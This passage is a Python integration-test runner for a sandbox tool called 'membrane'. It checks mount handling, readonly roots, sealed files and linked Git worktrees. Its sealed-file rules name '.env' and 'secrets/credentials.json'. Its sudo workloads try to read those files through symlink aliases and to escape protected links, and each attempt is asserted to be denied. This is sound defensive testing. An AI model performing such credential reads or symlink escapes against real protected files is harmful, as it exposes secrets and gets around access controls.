    (shared / '.membrane.yaml').write_text(json.dumps({
        'sealed': ['*'], 'mounts': [{'path': str(unselected)}]}))
    (shared / 'linked tree').mkdir()
    (shared / 'linked tree/child').write_text('symlink target\n')
    (shared / 'linked tree/back').symlink_to('.', target_is_directory=True)
    (workspace / 'selected-link').symlink_to(shared / 'linked tree', target_is_directory=True)
    (workspace / 'shared-alias').symlink_to(shared, target_is_directory=True)
    (shared / 'sealed-dangling').symlink_to('missing-target')
    (shared / 'parent-target').write_text('parent anchored\n')
    (shared / 'absolute-target.txt').write_text('absolute anchored\n')
    (shared / 'only-alias').write_text('not traversed via alias\n')
    (readonly / '.env').write_text('sealed over readonly baseline\n')
    (readonly / 'file').write_text('readonly\n')
    copy_policy_workload(workspace)
    policy_home = base / 'policy-home'
    (policy_home / '.membrane').mkdir(parents=True)
    (policy_home / '.membrane/src').symlink_to(REPO_ROOT, target_is_directory=True)
    (policy_home / '.membrane/config.yaml').write_text(
        "mounts: [{path: '../global library'}, {path: '../shared library'}]\n"
        "sealed: [global-only, './global-anchor']\nreadonly: [global-readonly, .env]\n")
    env = dict(ctx.environment, HOME=str(policy_home))
    env.setdefault('DOCKER_CONFIG', str(Path.home() / '.docker'))
    if sys.platform == 'darwin' and not env.get('COLIMA_HOME'):
        colima_home = Path.home() / '.colima'
        if not colima_home.is_dir():
            colima_home = Path(env.get('XDG_CONFIG_HOME') or Path.home() / '.config') / 'colima'
        env['COLIMA_HOME'] = str(colima_home)
    # JSON is YAML; quoting preserves absolute paths and spaces on both hosts.
    mounts = [{'path': '../shared link'}, {'path': str(shared), 'mode': 'rw'},
              {'path': str(readonly), 'mode': 'ro'}, {'path': '../empty readonly', 'mode': 'ro'},
              {'path': '.', 'mode': 'rw'}]
    (workspace / '.membrane.yaml').write_text(json.dumps({
        'mounts': mounts, 'sealed': ['.env', 'secrets/credentials.json', 'selected-link', 'sealed-dangling'],
        'readonly': ['workspace-readonly']}))
    command = ['sudo', 'python3', '-c', '''import runpy, sys
from pathlib import Path
p = runpy.run_path('policy-workload.py')
workspace, shared, readonly, empty, global_dir = map(Path, sys.argv[1:6])
assert Path.cwd() == workspace
assert not (workspace.parent / 'parent-only').exists()
assert not (workspace.parent / 'unselected').exists()
assert not (workspace.parent / 'shared link').exists()
assert not (shared / 'outside/file').exists()
assert global_dir.exists() == (sys.argv[6] == 'false')
if global_dir.exists(): (global_dir / 'written').write_text('global writeback')
for root in [workspace, shared] + ([global_dir] if global_dir.exists() else []):
    for name in ('.env', 'nested/.env', 'secrets/credentials.json', 'nested/secrets/credentials.json'):
        path = root / name
        p['denied']('unanchored selector: ' + str(path), path.read_bytes)
    for name in ('unrelated', 'nested/mysecrets/credentials.json'):
        (root / name).write_text('ordinary writeback')
    assert (root / 'workspace-readonly').read_bytes()
    p['denied']('workspace readonly across roots', lambda: (root / 'workspace-readonly').write_text('bad'))
    if sys.argv[6] == 'false':
        p['denied']('global sealed across roots', (root / 'global-only').read_bytes)
        assert (root / 'global-readonly').read_bytes()
        p['denied']('global readonly across roots', lambda: (root / 'global-readonly').write_text('bad'))
    else:
        (root / 'global-only').write_text('global skipped')
        (root / 'global-readonly').write_text('global skipped')
if sys.argv[6] == 'false':
    p['denied']('global relative anchor uses primary workspace', (workspace / 'global-anchor').read_bytes)
else:
    (workspace / 'global-anchor').write_text('global skipped')
(shared / 'global-anchor').write_text('anchor excludes additional root')
p['denied']('sealed beats readonly mount baseline', (readonly / '.env').read_bytes)
p['denied']('protected link into selected root', (workspace / 'selected-link/child').read_bytes)
p['denied']('resolved selected target', (shared / 'linked tree/child').read_bytes)
p['denied']('protected symlink itself', (workspace / 'selected-link').unlink)
p['denied']('dangling protected symlink', (shared / 'sealed-dangling').unlink)
p['denied']('alias cannot clear selected target policy', (workspace / 'shared-alias/.env').read_bytes)
(shared / 'written').write_text('additional writeback')
(workspace / 'written').write_text('primary writeback')
p['access'](readonly / 'file', False)
p['denied']('readonly child creation', lambda: (readonly / 'new').touch())
p['denied']('empty readonly root creation', lambda: (empty / 'new').touch())
p['gate']()
''', str(workspace), str(shared), str(readonly), str(empty), str(global_dir)]
    for skip in (False, True):
        # Check HOME before sudo, which may choose root's HOME.
        probe = ['bash', '-c', 'test "$HOME" = /home/agent && exec "$@"', 'mount-check',
                 *command, str(skip).lower()]
        with Session(ctx, workspace, probe, env=env,
                     options=['--no-trace', '--no-global-config=' + str(skip).lower()]) as session:
            session.wait_for('ready')
            agent = inspect(ctx, 'membrane-agent-' + session.id)
            expected = {str(p) for p in (workspace, shared, readonly, empty)}
            if not skip:
                expected.add(str(global_dir))
            selected = [m for m in agent['Mounts'] if m['Source'] in expected]
            check(ctx, len(selected) == len(expected)
                  and all(m['Source'] == m['Destination'] for m in selected)
                  and agent['Config']['WorkingDir'] == str(workspace),
                  f'37 skip global={skip}: canonical mounts, deduplication and primary working directory')
            handler = inspect(ctx, 'membrane-handler-' + session.id)
            roots = [m for m in handler['Mounts'] if m['Destination'].startswith('/policy-roots/')]
            check(ctx, {m['Source'] for m in roots} == expected
                  and all(not m['RW'] for m in roots), 'handler gets only selected roots needed for enrollment')
            session.release()
            output = session.wait()
            ctx.output.extend(line for line in output.splitlines() if line.startswith('PASS '))
            cleaned(ctx, session)
        for name in ('ready', 'continue'):
            (workspace / name).unlink()
        check(ctx, (shared / 'written').read_text() == 'additional writeback'
              and (workspace / 'written').read_text() == 'primary writeback', '37 rw host writeback')
    check(ctx, (global_dir / 'written').read_text() == 'global writeback', '37 relative global mount writeback')
    # Anchors select locations without adding mounts or following directory aliases.
    (workspace / '.membrane.yaml').write_text(json.dumps({
        'mounts': mounts,
        'sealed': ['./.env', './secrets/credentials.json', '../shared library/nested/../parent-target',
                   str(shared / 'nested/../absolute-*.txt'), '../unselected/file', str(unselected / 'file'),
                   './shared-alias/only-alias', './missing']}))
    result = membrane(ctx, ['sudo', 'python3', '-c', """import runpy, sys
from pathlib import Path
p = runpy.run_path('policy-workload.py')
workspace, shared = map(Path, sys.argv[1:])
for root in (workspace, shared):
    for name in ('.env', 'nested/.env', 'secrets/credentials.json', 'nested/secrets/credentials.json'):
        path = root / name
        if root == workspace and name in ('.env', 'secrets/credentials.json'):
            p['denied']('primary anchored selector: ' + name, path.read_bytes)
        else:
            assert path.read_bytes()
            path.write_text('outside primary anchor')
for name in ('parent-target', 'absolute-target.txt'):
    p['denied']('additional anchored selector: ' + name, (shared / name).read_bytes)
assert (workspace / 'shared-alias/only-alias').read_bytes()
(shared / 'only-alias').write_text('directory alias is not a traversal root')
assert not (workspace.parent / 'unselected').exists()
assert not (shared / 'outside/file').exists()
assert not (workspace / 'missing').exists()
print('PASS anchors, component boundaries and selected-tree containment', flush=True)
""", str(workspace), str(shared)], cwd=workspace, env=env)
    ctx.output.extend(line for line in result.stdout.splitlines() if line.startswith('PASS '))
    (workspace / '.membrane.yaml').write_text(json.dumps({
        'mounts': mounts, 'sealed': ['../shared library/outside']}))
    result = membrane(ctx, ['echo', 'workload-started'], cwd=workspace, env=env, expected=None)
    check(ctx, result.returncode != 0 and 'must resolve within a selected directory' in result.stderr
          and 'workload-started' not in result.stdout, '37 protected symlink escape rejected before startup')
    for entries, message in (
        ([{'path': '../shared library', 'mode': 'invalid'}], 'must be ro or rw'),
        ([{'path': '../missing'}], 'no such file'),
        ([{'path': '../parent-only'}], 'not a directory'),
        ([{'path': '.', 'mode': 'ro'}], 'conflicting modes'),
        ([{'path': '../shared link', 'mode': 'ro'}, {'path': str(shared), 'mode': 'rw'}], 'conflicting modes'),
    ):
        (workspace / '.membrane.yaml').write_text(json.dumps({'mounts': entries}))
        result = membrane(ctx, ['echo', 'workload-started'], cwd=workspace, env=env, expected=None)
        check(ctx, result.returncode != 0 and message in result.stderr and 'workload-started' not in result.stdout,
              '37 invalid mount fails before workload: ' + message)
    check(ctx, not (base / 'missing').exists(), '37 missing source was not created')


def group_38(ctx):
    repo = (ctx.workdir / 'repo').resolve()
    repo.mkdir()
    # Host-only fixture setup must not run personal hooks or require signing.
    # Command-local options leave the agent's Git operations below unchanged.
    git = ['git', '-c', 'core.hooksPath=/dev/null', '-c', 'commit.gpgSign=false']
    run(ctx, [*git, 'init', str(repo)])
    (repo / 'tracked').write_text('original\n')
    run(ctx, [*git, '-C', str(repo), 'add', 'tracked'])
    run(ctx, [*git, '-C', str(repo), '-c', 'user.name=Membrane Test', '-c',
              'user.email=membrane@example.invalid', 'commit', '-m', 'fixture'])
    workspace = repo / '.worktrees/fix'
    sibling = repo / '.worktrees/sibling'
    run(ctx, [*git, '-C', str(repo), 'worktree', 'add', '-b', 'fix', str(workspace)])
    run(ctx, [*git, '-C', str(repo), 'worktree', 'add', '-b', 'sibling', str(sibling)])
    for directory in ('readonly/rw', 'sealed/rw', 'rw/ro', 'rw/ro-sibling'):
        (workspace / directory).mkdir(parents=True)
        (workspace / directory / 'file').write_text('fixture\n')
    # Unanchored selectors also match outside the primary worktree.
    (repo / 'sealed').write_text('additional sealed file\n')
    (repo / 'readonly/rw').mkdir(parents=True)
    (repo / 'readonly/rw/file').write_text('inherited additional readonly\n')
    (repo / 'worktree-alias').symlink_to('.worktrees/fix', target_is_directory=True)
    copy_policy_workload(workspace)
    mounts = [{'path': str(repo), 'mode': 'ro'}, {'path': '.', 'mode': 'rw'},
              {'path': 'readonly/rw', 'mode': 'rw'}, {'path': 'sealed/rw', 'mode': 'rw'},
              {'path': 'rw', 'mode': 'rw'}, {'path': 'rw/ro', 'mode': 'ro'},
              {'path': str(repo / 'readonly/rw'), 'mode': 'rw'}]
    for reverse in (False, True):
        (workspace / '.membrane.yaml').write_text(json.dumps({
            'mounts': list(reversed(mounts)) if reverse else mounts,
            'readonly': ['readonly/', 'sealed/'], 'sealed': ['sealed/']}))
        result = membrane(ctx, ['sudo', 'python3', '-c', '''import runpy, subprocess, sys
from pathlib import Path
p = runpy.run_path('policy-workload.py')
repo = Path(sys.argv[1])
assert str(Path.cwd()) == sys.argv[2]
assert subprocess.check_output(['git', 'log', '-1', '--format=%s'], text=True).strip() == 'fixture'
Path('tracked').write_text('edited\\n')
Path('created').write_text('new file\\n')
assert '+edited' in subprocess.check_output(['git', 'diff', '--', 'tracked'], text=True)
Path('rw/ordinary').write_text('ordinary\\n')
Path('rw/ro-sibling/file').write_text('prefix sibling writable\\n')
p['access'](repo / 'sealed', True)
p['access'](repo / 'readonly/rw/file', False)
p['access'](repo / 'tracked', False)
p['access'](repo / '.worktrees/sibling/tracked', False)
p['denied']('readonly repo root', lambda: (repo / 'new').touch())
p['denied']('readonly child', lambda: Path('rw/ro/new').touch())
p['access']('rw/ro/file', False)
p['access']('readonly/rw/file', False)
p['access']('sealed/rw/file', True)
p['access'](repo / 'worktree-alias/readonly/rw/file', False)
p['access'](repo / 'worktree-alias/sealed/rw/file', True)
(repo / 'worktree-alias/tracked').write_text('edited through ancestor alias\\n')
for args in (['add', 'tracked'], ['update-ref', 'refs/heads/must-not-exist', 'HEAD']):
    result = subprocess.run(['git', *args], text=True, capture_output=True)
    assert result.returncode != 0 and 'Permission denied' in result.stderr, result
print('PASS linked-worktree history, diff and edits; metadata writes denied', flush=True)
''', str(repo), str(workspace)], cwd=workspace)
        ctx.output.extend(line for line in result.stdout.splitlines() if line.startswith('PASS '))
        check(ctx, (workspace / 'tracked').read_text() == 'edited through ancestor alias\n'
              and (workspace / 'created').read_text() == 'new file\n'
              and (sibling / 'tracked').read_text() == 'original\n',
              f'38 reverse={reverse}: both overlap directions, inherited selectors and linked worktree')


@dataclass(frozen=True)
class TestGroup:
    description: str
    run: Callable[[Context], None]


GROUPS = {
    1: TestGroup("hostname HTTP passthrough", group_1),
    2: TestGroup("URL allowlist prefixes", group_2),
    3: TestGroup("HTTP method restrictions", group_3),
    4: TestGroup("HTTP methods with URL prefixes", group_4),
    5: TestGroup("absolute HTTP path rules", group_5),
    6: TestGroup("relative HTTP path rules", group_6),
    7: TestGroup("multiple HTTP rules per destination", group_7),
    8: TestGroup("multiple allowlist destinations", group_8),
    9: TestGroup("default-deny host policy", group_9),
    10: TestGroup("CLI hostname and URL allowlists", group_10),
    11: TestGroup("DNS filtering and resolver bypass", group_11),
    12: TestGroup("HTTP path boundaries", group_12),
    13: TestGroup("HTTP rules on hostname destinations", group_13),
    14: TestGroup("sealed filesystem objects", group_14),
    15: TestGroup("HTTP rules on IP destinations", group_15),
    16: TestGroup("multi-question DNS rejection", group_16),
    17: TestGroup("UDP default deny and port opt-in", group_17),
    18: TestGroup("HTTP path traversal rejection", group_18),
    19: TestGroup("raw TCP with HTTP-only host rules", group_19),
    20: TestGroup("combined URL and HTTP path constraints", group_20),
    21: TestGroup("raw TCP with HTTP-only IP rules", group_21),
    22: TestGroup("HTTPS rules on nonstandard ports", group_22),
    23: TestGroup("wildcard subdomains and apex exclusion", group_23),
    24: TestGroup("all-host wildcard and port restrictions", group_24),
    25: TestGroup("eBPF tracing and session isolation", group_25),
    26: TestGroup("readonly filesystem paths", group_26),
    27: TestGroup("filesystem policy precedence", group_27),
    28: TestGroup("tracing modes and failure handling", group_28),
    29: TestGroup("workspace paths, traced workload lifecycle and terminal I/O", group_29),
    30: TestGroup("filesystem LSM isolation, lifecycle and startup snapshot", group_30),
    31: TestGroup("security supervisor fail-stop, cgroup isolation and signals", group_31),
    32: TestGroup("HTTP deny precedence, methods, paths and ports", group_32),
    33: TestGroup("transport denies, DNS, wildcards and UDP", group_33),
    34: TestGroup("deny config merging, CLI precedence and unsupported UDP constraints", group_34),
    35: TestGroup("fragmented HTTP/TLS deny inspection", group_35),
    36: TestGroup("editable agent instructions and global configuration mounts", group_36),
    37: TestGroup("additional directory mounts, configuration and readonly roots", group_37),
    38: TestGroup("mount overlaps, selector inheritance and linked worktrees", group_38),
}


def run_group(number, membrane_cmd, environment, artifacts, keep_artifacts):
    output = [f"=== {number:02}: {GROUPS[number].description} ==="]
    directory = None
    passed = False
    try:
        directory = Path(tempfile.mkdtemp(prefix=f"membrane-test-{number:02}-", dir=artifacts))
        ctx = Context(number, membrane_cmd, directory, environment.copy(), output)
        GROUPS[number].run(ctx)
        passed = True
    except TestFailure as error:
        output.append("FAIL " + str(error))
    except Exception:
        output.append("FAIL " + traceback.format_exc())
    if directory is not None:
        try:
            if keep_artifacts or not passed:
                # Copy handler logs alongside the exact command output and inputs.
                for idfile in directory.rglob("session-id*"):
                    session_id = idfile.read_text().strip()
                    if not session_id:
                        continue
                    log = Path.home() / ".membrane/logs" / f"membrane-handler-{session_id}.log"
                    if not log.exists():
                        log = log.with_suffix(".log.gz")
                    if log.exists():
                        shutil.copy2(log, directory / log.name)
                        output.append(f"Handler log: {directory / log.name}")
                output.append(f"Artifacts retained: {directory}")
                (directory / "result.log").write_text("\n".join(output) + "\n")
            else:
                shutil.rmtree(directory)
        except Exception as error:
            passed = False
            output.append(f"FAIL artifact cleanup/reporting: {error}\nArtifacts retained: {directory}")
    return passed, "\n".join(output) + "\n"


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-g", "--group", action="append", metavar="GROUPS",
                        help="group numbers, comma-separated or repeated (default: all)")
    parser.add_argument("-l", "--list", action="store_true", help="list groups and exit")
    parser.add_argument("-j", "--jobs", type=int, metavar="N", help="concurrent groups (default: CPU count)")
    parser.add_argument("--keep-artifacts", action="store_true", help="retain successful group artifacts too")
    parser.add_argument("--no-warmup", action="store_true", help="skip the one-time image and binary warmup")
    args = parser.parse_args()
    if args.jobs is not None and args.jobs < 1:
        parser.error("--jobs must be at least 1")
    selected = set(GROUPS)
    if args.group is not None:
        try:
            selected = {int(value) for flag in args.group for value in flag.split(",")}
        except ValueError:
            parser.error("--group requires comma-separated group numbers")
        unknown = selected - GROUPS.keys()
        if unknown:
            parser.error("unknown group(s): " + ", ".join(map(str, sorted(unknown))))
    if args.list:
        for number, group in GROUPS.items():
            print(f"{number:<3} {group.description}")
        return 0

    environment = dict(os.environ)
    if sys.platform == "darwin":
        environment.setdefault("DOCKER_CONTEXT", "colima-membrane")
    membrane_cmd = environment.get("MEMBRANE_CMD", str(REPO_ROOT / "membrane"))
    # Resolve explicit relative paths before workers change their subprocess cwd.
    if os.sep in membrane_cmd:
        membrane_cmd = str(Path(membrane_cmd).expanduser().resolve())
    if not args.no_warmup:
        print("=== Warmup ===", flush=True)
        try:
            result = run(None, [str(REPO_ROOT / "scripts/run-dev.sh"), "--no-update", "--no-trace",
                                "--no-global-config", "--", "echo", "ok"],
                         cwd=REPO_ROOT, env=environment, timeout=1800)
        except TestFailure as error:
            print(f"FAIL {error}")
            return 1
        print(result.stdout + result.stderr, end="", flush=True)

    if sys.platform == "linux" and os.geteuid() != 0:
        print("membrane tests: requesting sudo for workload cgroup setup and cleanup", file=sys.stderr, flush=True)
        # Authenticate after the build, in the foreground before workers
        # redirect I/O. Native workers retain this terminal via start_process().
        try:
            subprocess.run(["sudo", "-v"], check=True)
        except (OSError, subprocess.CalledProcessError) as error:
            print(f"FAIL host sudo authentication: {error}", file=sys.stderr)
            return 1

    # Home is shared by Colima, whereas macOS /private/tmp need not be.
    artifacts = Path.home() / ".membrane/tmp"
    artifacts.mkdir(parents=True, exist_ok=True)
    jobs = args.jobs if args.jobs is not None else min(len(selected), os.cpu_count() or 4)
    failed = []
    with ThreadPoolExecutor(max_workers=jobs) as executor:
        futures = {executor.submit(run_group, number, membrane_cmd, environment, artifacts,
                                   args.keep_artifacts): number for number in sorted(selected)}
        for future in as_completed(futures):
            passed, output = future.result()
            print(output, flush=True)
            if not passed:
                failed.append(futures[future])
    print(f"{len(selected) - len(failed)} passed, {len(failed)} failed")
    for number in sorted(failed):
        print(f"Failed {number:02}: {GROUPS[number].description}")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
